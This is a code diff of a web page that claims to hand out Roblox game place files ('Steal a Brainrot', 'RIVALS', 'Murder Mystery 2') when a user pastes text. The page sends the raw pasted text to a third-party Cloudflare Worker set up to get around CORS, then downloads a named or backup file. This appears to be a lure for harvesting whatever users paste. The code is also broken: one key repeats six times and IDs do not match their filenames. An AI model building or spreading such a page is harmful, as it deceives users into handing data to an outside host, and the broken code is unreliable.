@@ -387,34 +387,32 @@ button:disabled {
   // 1) ID → FILENAME for the download.
   //    The KEY matches ANYWHERE in the pasted text,
   //    so "1537690962" also matches "es/1537690962/".
-  //    Keep this list in sync with ID_CONTENT in Code.gs.
+  //    Keep this list in sync with ID_FILE_IDS / ID_CONTENT in Code.gs.
   const ID_FILES = {
-    '1537690962': 'gamecopy-es-1537690962.txt',
-    '2000000001': 'gamecopy-file-01.txt',
-    '2000000002': 'gamecopy-file-02.txt',
-    '2000000003': 'gamecopy-file-03.txt',
-    '2000000004': 'gamecopy-file-04.txt',
-    '2000000005': 'gamecopy-file-05.txt',
-    '2000000006': 'gamecopy-file-06.txt',
-    '2000000007': 'gamecopy-file-07.txt',
-    '2000000008': 'gamecopy-file-08.txt',
-    '2000000009': 'gamecopy-file-09.txt'
+  '109983668079237': 'place 123923334828954 Steal a Brainrot.rbxlx',
+  '120219252362013': 'place 120219252362013 Throw Food For Animals.rbxlx',
+  '107778070777162': 'place 107778070777162 Steal An Egg.rbxlx',
+  '17625359962': 'place 17625359962 RIVALS.rbxlx',
+  '142823291': 'place 142823291 Murder Mystery 2.rbxlx',
+  '109983668079237': 'place 123923334828954 Steal a Brainrot.rbxlx',
+  '109983668079237': 'place 123923334828954 Steal a Brainrot.rbxlx',
+  '109983668079237': 'place 123923334828954 Steal a Brainrot.rbxlx',
+  '109983668079237': 'place 123923334828954 Steal a Brainrot.rbxlx',
+  '109983668079237': 'place 123923334828954 Steal a Brainrot.rbxlx',
   };
 
   // 2) Filename used when NO ID matches.
-  //    (The CONTENT of that backup file is set in Code.gs → BACKUP_TEXT
-  //     or BACKUP_FILE_ID. This HTML only names the download.)
   const DEFAULT_FILE = 'backup.txt';
 
   // 3) true  = refuse to send unless an ID matches
   //    false = send anyway and download the backup file
   const REQUIRE_MATCH = false;
 
-  // 4) Worker endpoint (paste your Apps Script /exec URL here).
+  // 4) Worker endpoint (your Cloudflare Worker that proxies to the
+  //    Apps Script /exec URL — it exists to dodge CORS).
   const WORKER_URL = 'https://worker2.edgar69-help.workers.dev/';
 
   // 5) Token sent to worker as body.token.
-  //    Leave '' if you don't want to enforce it.
   //    Must match SECRET in Code.gs (only matters if REQUIRE_TOKEN=true there).
   const WORKER_TOKEN = '';
 
@@ -496,7 +494,6 @@ button:disabled {
     setStatus('Sending…');
 
     try {
-      // Send id too so the worker can pick the right content.
       const payload = { text: raw, id: match.id || '' };
       if (WORKER_TOKEN) payload.token = WORKER_TOKEN;
 
@@ -515,7 +512,7 @@ button:disabled {
 
       const a = document.createElement('a');
       a.href = url;
-      a.download = match.file;   // per-ID filename (backup.txt if no match)
+      a.download = match.file;
       document.body.appendChild(a);
       a.click();
       a.remove();
